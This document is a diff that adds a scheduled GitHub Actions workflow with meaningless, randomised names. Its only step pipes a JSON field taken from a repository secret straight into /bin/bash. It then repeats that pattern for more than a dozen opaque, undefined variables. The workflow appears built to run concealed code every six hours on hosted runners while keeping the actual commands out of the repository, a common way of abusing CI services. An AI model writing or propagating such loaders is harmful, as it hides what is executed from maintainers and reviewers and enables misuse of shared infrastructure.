@@ -1,0 +1,31 @@
+name: mucaoqiutong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mucaoqiutong
+        env:
+          r79: ${{ secrets.r79 }}
+        run: |
+          echo $r79 | jq -r .atyp3 | /bin/bash
+          echo $hwg918 | jq -r .uhz9 | /bin/bash
+          echo $pwenv86011 | jq -r .gu92249 | /bin/bash
+          echo $ic6845 | jq -r .nj47 | /bin/bash
+          echo $pdjhy9136 | jq -r .ezp0145 | /bin/bash
+          echo $li21 | jq -r .qorv421 | /bin/bash
+          echo $we5 | jq -r .v6 | /bin/bash
+          echo $n10436 | jq -r .ygq1036 | /bin/bash
+          echo $fe7587 | jq -r .p4 | /bin/bash
+          echo $miggx00209 | jq -r .joq9821 | /bin/bash
+          echo $ctt8900 | jq -r .u09 | /bin/bash
+          echo $q78 | jq -r .k64 | /bin/bash
+          echo $uiewz6475 | jq -r .s2289 | /bin/bash
+          echo $qty3 | jq -r .xqg8 | /bin/bash
+
